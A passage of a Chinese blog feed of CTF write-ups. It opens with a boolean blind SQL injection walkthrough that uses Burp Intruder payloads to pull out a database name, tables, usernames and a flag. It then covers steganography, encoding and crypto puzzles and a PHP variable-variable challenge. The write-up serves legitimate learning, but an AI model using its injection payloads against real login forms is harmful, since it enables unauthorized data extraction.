class="language-python">username<span class="token operator">=</span><span class="token number">0</span>" <span class="token keyword">or</span> length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1234</span></code></pre><p>然后就错了，这个证明没有10大，再试试等于10的情况。</p><pre class="language-python" data-language="python"><code class="language-python">username<span class="token operator">=</span><span class="token number">0</span>" <span class="token keyword">or</span> length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">10</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1234</span></code></pre><p>对了，然后就可以爆库名了<br>右键单击空白然后<code>Send to intruder</code></p><pre class="language-python" data-language="python"><code class="language-python">username<span class="token operator">=</span><span class="token number">0</span>" <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>§num1§<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>§num2§<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1234</span></code></pre><p>两个变量，这里<code>Attack type</code>选择第四个，<code>Cluster bomb</code><br>去到Payload页面：<br>Payload set :1<br>payload type:Number类型<br>from：1<br>To：10<br>Step：1<br>第二个类似，from：0<br>To ：127（因为ASCII码表127个）<br>step：1<br><img src="https://img-blog.csdnimg.cn/2020030813411447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>回到Positions页面点击<code>Start attack</code><br>结果如下：选择<code>length</code>点击两次就会出现下图的样子<br><img src="https://img-blog.csdnimg.cn/20200308140654903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里百度搜索ASCII码在线转换工具，将这些ASCII码值转换成字母<a href="https://www.mokuge.com/tool/asciito16/">点击直接跳到ASCII码在线转换工具</a><br>解码后，得到的值是<code>challenges</code><br>下一步：爆表名</p><pre class="language-python" data-language="python"><code class="language-python">username<span class="token operator">=</span><span class="token number">0</span>" <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>select table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>§num1§<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>§num2§ <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">&amp;</span>password<span class="token operator">=</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200308200619549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>转换成字母就是<code>user_1</code><br>爆列名</p><pre class="language-python" data-language="python"><code class="language-python">username<span class="token operator">=</span><span class="token number">0</span>" <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token builtin">ascii</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>select username <span class="token keyword">from</span> user_1 limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>§num1§<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>§num2§<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">&amp;</span>password<span class="token operator">=</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200308204007101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>转换后：<code>qwzf</code>👀学长名字😂<br>改变limit参数，爆出第二列<br><img src="https://img-blog.csdnimg.cn/20200308204629312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>转换后：<code>lemon</code>又一个，好想明白点什么。嘿嘿！<br>接着爆，因为flag在数据库里<br><img src="https://img-blog.csdnimg.cn/20200308205645349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>又一个，转换后：<code>admin</code><br>看还有没了，好像没了。what？？？flag哪去了？？？<br>那先爆值看看吧。<br><img src="https://img-blog.csdnimg.cn/20200308211335375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>呃呃呃呃呃…………………………………………<br>这是啥？？？？<img src="https://img-blog.csdnimg.cn/20200308211814217.jpg" alt="在这里插入图片描述" loading="lazy"><br>这么多，，，，很可能就是flag了。看一下是啥。<br>SL{1_@m_B001_Bl1nd_inje4t}出来了，我还犯了个眼瞎的错误，害，不说了，总之又丢人了。<br><img src="https://img-blog.csdnimg.cn/20200308213056865.jpg" alt="在这里插入图片描述" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记——小记</title>
      <link href="/posts/a4391401/"/>
      <url>/posts/a4391401/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h2><p><img src="https://img-blog.csdnimg.cn/20200420093151978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>下载图片后，很大的一张图片，里面必定有东西，foremost分离<br>得到压缩包。<br>解压后是一张jpg格式的图片，但是打不开，猜想应该可能会是文件头缺少，打开010Editor，看一下，发现有点不对劲，<br><img src="https://img-blog.csdnimg.cn/20200420093522647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>好像是个avi文件，改后缀。打开是一个小视频，好像看过，钉钉来着，全程在叫baba哈。看到中间有几张带二维码的图片闪过去了。太快看不清，用放在PR里逐帧分离，用截图工具Snipaste截取二维码QQ截图也行，（注意截图时，不要截到其他部分，否则修复二维码时会出现解码失败的现象）。<br>放在扫描工具里修复二维码并扫码<br><img src="https://img-blog.csdnimg.cn/20200420095011108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>全部扫出来，得到字符串，观察发现符合base16编码的特征。于是进行base16解码<br><img src="https://img-blog.csdnimg.cn/20200420095146619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个答案好奇怪，栅栏也不是啊。难道是什么新的加密？看看比赛时给的wp，<br><img src="https://img-blog.csdnimg.cn/20200420095846458.png" alt="Augenstern" loading="lazy"><br>呃呃呃，是这样吗？？？？？？<br>flag：BJD{imagin_love_Y1ng}</p><h2 id="安恒月赛——6G还会远吗"><a href="#安恒月赛——6G还会远吗" class="headerlink" title="安恒月赛——6G还会远吗"></a>安恒月赛——6G还会远吗</h2><p>题目链接：<a href="http://server.zhaoj.in:8888/1GTest.file">http://server.zhaoj.in:8888/1GTest.file</a><br><img src="https://img-blog.csdnimg.cn/20200505160031618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>14天啊，是挺无语的，当时想抓包改什么参数来着，全都失败。结果看了wp就是直接将没下载完的文件，放在winhex或010Editor里看。<br><img src="https://img-blog.csdnimg.cn/20200505160257998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>大写的服！</p><pre class="language-bash" data-language="bash"><code class="language-bash">DASCTF<span class="token punctuation">&#123;</span>welcome_to_DAS_Ap1r1<span class="token punctuation">&#125;</span></code></pre><h2 id="黄金六年"><a href="#黄金六年" class="headerlink" title="黄金六年"></a>黄金六年</h2><p><img src="https://img-blog.csdnimg.cn/20200505171323406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>之前学长给我们看过这个，所以直接进PR里一帧一帧看了，在四本书上看到了二维码，手机扫不出来，当然不是全部，反正我的是扫不出来。<br>我用QR Research直接扫出来四个信息。<br><img src="https://img-blog.csdnimg.cn/20200505171655874.png" alt="Augenstern" loading="lazy"><br>交flag发现不对，有点奇怪，然后才发现学长给我们看这个题，没让我们看完，还有接下来的步骤。<br>将视频拖进010Editor中滑到最后，发现了base64编码<br><img src="https://img-blog.csdnimg.cn/20200505171906965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>进行解码，看到是rar压缩包，<br><img src="https://img-blog.csdnimg.cn/20200505171952931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后大佬们的办法是写脚本，我不会写，只能另外找办法。我就想到将base64编码转换成16进制，然后再保存为rar文件，好像可行。试一下。<br><img src="https://img-blog.csdnimg.cn/20200505172224958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>网站地址：<a href="https://the-x.cn/base64/">base64转换成16进制</a><br>然后，复制十六进制的编码粘贴到HxD中进行保存。<br><img src="https://img-blog.csdnimg.cn/20200505172418680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>保存后，打开看看，果然能打开，加密的，密码就是前面得到的那个字符串，解压得到flag<br><img src="https://img-blog.csdnimg.cn/20200505172624551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>提交正确。</p><h2 id="安洵杯-2019-吹着贝斯扫二维码"><a href="#安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="[安洵杯 2019]吹着贝斯扫二维码"></a>[安洵杯 2019]吹着贝斯扫二维码</h2><p><img src="https://img-blog.csdnimg.cn/20200505172943244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>解压发现一堆文件<br><img src="https://img-blog.csdnimg.cn/20200505174114206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>而且压缩包还是加密的，看看那些文件，发现都有JPEG，可能是jpg图片，先改一个看看。<br><img src="https://img-blog.csdnimg.cn/20200505174349348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>有点东西，总不能一个一个改吧？这么多，然后在百度的小角落里发现了一个工具——格式工厂(最喜欢工具了)<br><img src="https://img-blog.csdnimg.cn/20200505175208331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>真快，看一下。<br><img src="https://img-blog.csdnimg.cn/20200505175414827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>好家伙，拼图。得到36张图，可以拼一张6x6的大图。<br>将文件夹拖进kali。然后使用工具拼图。<br>在文件夹内打开终端</p><pre class="language-css" data-language="css"><code class="language-css">montage *jpg -tile 6x6 -geometry 134x130+0+0 out.jpg</code></pre><p>然后得到一张混乱无序的图。<br><strong>注意这里的像素：要和分裂的二维码残片的像素一致才能得出这样的二维码乱序图。如果像素不一样了，就得不到这样的图，当然后面的步骤也就无法进行下去。</strong><br>而这张图的像素：打开一张二维码片段，然后看它的属性里面——详细信息<br><img src="https://img-blog.csdnimg.cn/20200505223036689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200505222625590.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>再使用gaps还原</p><pre class="language-css" data-language="css"><code class="language-css">gaps --image=out.jpg --generations=40 --population=36 --size=100</code></pre><p>没还原出来，尴尬哈，，，，不知道怎么回事，我试了n次了，就是还原不出来。奇怪了。最后我实在是没办法了，只上手了。在PPT里拼的。md 累死，我拼了俩小时(泪流满面.gif)<br><img src="https://img-blog.csdnimg.cn/20200505234610382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>扫描吧，终于可以扫了。<br><img src="https://img-blog.csdnimg.cn/20200505235154308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>emmm，啥玩意儿。好像还有个flag.zip没看。<br><img src="https://img-blog.csdnimg.cn/20200505235349587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>嗷嗷，还有编码。复制出来解密。<br>上面扫出来的好像是加密顺序，因为题目中的二维码已经扫过了，还有贝斯。那应该是base编码。<br>这个编码好像是base32 编码，那就是解密过程，上面的是加密顺序，将它逆转一下。开始解码。<br>这题真的给我解吐了。转过来转过去。<br>得到压缩包密码，ThisIsSecret!233<br>解压flag.zip得到</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">flag</span><span class="token punctuation">&#123;</span>Qr_Is_MeAn1nGfuL<span class="token punctuation">&#125;</span></code></pre><p>这一道题真是耗费我好长时间。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h2><p><img src="https://img-blog.csdnimg.cn/20200423214819610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看着是年份，还是六十甲子年份。应该是要换成数字。于是百度对照表。把数字对照出来。而且背面还写了<code>+甲子</code>再加上60。一甲子是六十<br><img src="https://img-blog.csdnimg.cn/20200423215120794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第一想法应该是ASCII码表。对照出来。<br><img src="https://img-blog.csdnimg.cn/20200423215257727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后看着这一串字符，没了头绪。再看看题，没有提示了啊。然后发现一个重要的事，题目说传统密码加古典密码。我好像没用到古典密码啊。脑中快速过了一遍古典密码。这么短的字符串，应该会是凯撒密码，还有栅栏密码，其他的一下子没想太多。<br>八个字符，栅栏可以分两栏和四栏，试过之后是两栏的。<br><img src="https://img-blog.csdnimg.cn/20200423220621395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后凯撒解密。<br>得到<br><img src="https://img-blog.csdnimg.cn/20200423220653926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>至于是偏移5位，自己一个一个试出来的，就这个最靠谱。</p><h2 id="NPUCTF2020-这是什么觅🐎"><a href="#NPUCTF2020-这是什么觅🐎" class="headerlink" title="[NPUCTF2020]这是什么觅🐎"></a>[NPUCTF2020]这是什么觅🐎</h2><p>这个比赛我也看了，当时就看这一道题能看出来点门道，当然我一道题都没做出来，没什么可丢人的。就把这道题复现一下。也是成长过程。<br>下载得到一个文件，刚开始没有思路啊，没有想太多，不知道用什么方法打开，就直接payload++打开看了一眼，然后发现了<br><img src="https://img-blog.csdnimg.cn/20200425173827996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后，foremost分离文件，得到了压缩包。<br><img src="https://img-blog.csdnimg.cn/20200425173938202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个我没想到有什么古典密码是这个的，然后看着右下角的纸条，这种有空隙的，是不是键盘密码之类的，再仔细想想不对，放弃，后来看着上面的日历，在这里面找，没啥头绪。再回头看那串字符串。发现第一个字母都是大些且<code>F、W、S、S、T、S、W、S</code>有个规律就是他们英文单词星期的首字母。这个一想就靠谱，就抓住这一点来想。后面跟数字，再看日历，第一排画圈了。没错的，就是这样，字母后面跟两个数字的都是在一周中又重复出现的。所以第一个字母是他们的顺序。第二个字母才是出题人想给的信息。这样看出来就是<br><code>3 1 12 5 14 4 1 18</code>，我不知道为什么把1算上了，不是已经划了吗？？<br>不过不纠结这个，我到这里卡住了。所以后面的看的师傅们的博客知道的。然后发现是字母表的，我之前一直在猜ascii码，就这个没想到。所以一道题没做出来。最后<code>flag&#123;calendar&#125;</code></p><h2 id="robomunication"><a href="#robomunication" class="headerlink" title="robomunication"></a>robomunication</h2><p><img src="https://img-blog.csdnimg.cn/20200505162039172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>听得出来是摩斯密码，别说了，都是辛酸，这个哔哔哔波，纯手工。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token builtin class-name">.</span> .-<span class="token punctuation">..</span> .-<span class="token punctuation">..</span> --- .-- <span class="token punctuation">..</span><span class="token punctuation">..</span> .- - <span class="token punctuation">..</span> <span class="token punctuation">..</span>. - <span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token builtin class-name">.</span> -.- <span class="token builtin class-name">.</span> -.-- <span class="token punctuation">..</span> - <span class="token punctuation">..</span> <span class="token punctuation">..</span>. -<span class="token punctuation">..</span>. --- --- .--. -<span class="token punctuation">..</span>. <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> .--.</code></pre><p><img src="https://img-blog.csdnimg.cn/20200505162022706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>再把这个字符串看一下，最后是flag是BOOPBEEP</p><h2 id="Unencode"><a href="#Unencode" class="headerlink" title="Unencode"></a>Unencode</h2><p><img src="https://img-blog.csdnimg.cn/20200505163409123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>什么提示都没有，，就一串编码，而且看着怎么也不想不起来什么密码是这样的，见识短浅了。<br>是UUencode编码<br>直接在线网站解就行了。<br><a href="http://ctf.ssleye.com/uu.html">UUencode在线解码</a><br>flag{dsdasdsa99877LLLKK}</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>web题先从简单的来，不然太容易被搞乱心态。</p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p><img src="https://img-blog.csdnimg.cn/20200509202714432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>代码审计：</p><pre class="language-php" data-language="php"><code class="language-php">flag In the variable ! <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag1.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/^\w+$/"</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"var_dump(<span class="token interpolation"><span class="token variable">$$args</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>首先注意到的是正则表达式，关于正则表达式的学习，在学习PHP时了解过了，这个是要匹配正确的字符串。<br><code>\w</code> 匹配任意一个数字或字母或下划线<br>如果不匹配则直接die，匹配的话就输出一个可变变量，重点就在可变变量这里。我刚开始进行尝试，构造<code>?args=_lala_</code>结果输出了NULL，好像与eval函数有关，发现对eval函数了解的不够，就又查了一遍。<br><img src="https://img-blog.csdnimg.cn/2020050921085531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><code>$$args</code>代表一个变量，所以这里传一个全局变量给它，全局变量有九种，可以挨个试，九大全局变量在百度直接搜索就可以搜到。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token number">1</span><span class="token operator">|</span>$_POST       <span class="token punctuation">[</span>用于接收post提交的数据<span class="token punctuation">]</span><span class="token number">2</span><span class="token operator">|</span>$_GET        <span class="token punctuation">[</span>用于获取url地址栏的参数数据<span class="token punctuation">]</span><span class="token number">3</span><span class="token operator">|</span>$_FILES      <span class="token punctuation">[</span>用于文件就收的处理img 最常见<span class="token punctuation">]</span><span class="token number">4</span><span class="token operator">|</span>$_COOKIE     <span class="token punctuation">[</span>用于获取与<span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span>中的name 值<span class="token punctuation">]</span><span class="token number">5</span><span class="token operator">|</span>$_SESSION    <span class="token punctuation">[</span>用于存储session的值或获取session中的值<span class="token punctuation">]</span><span class="token number">6</span><span class="token operator">|</span>$_REQUEST    <span class="token punctuation">[</span>具有get<span class="token punctuation">,</span>post的功能，但比较慢<span class="token punctuation">]</span><span class="token number">7</span><span class="token operator">|</span>SERVER       <span class="token punctuation">[</span>是预定义服务器变量的一种，所有SERVER<span class="token punctuation">[</span>是预定义服务器变量的一种，所有_SERVER <span class="token punctuation">[</span>是预定义服务器变量的一种，所有_SERVER开头的都<span class="token number">8</span><span class="token operator">|</span>$GLOBALS     <span class="token punctuation">[</span>一个包含了全部变量的全局组合数组<span class="token punctuation">]</span><span class="token number">9</span><span class="token operator">|</span>$_ENV        <span class="token punctuation">[</span>是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它<span class="token punctuation">]</span></code></pre><p>然后，用到了GLOBALS就得到了flag<br><img 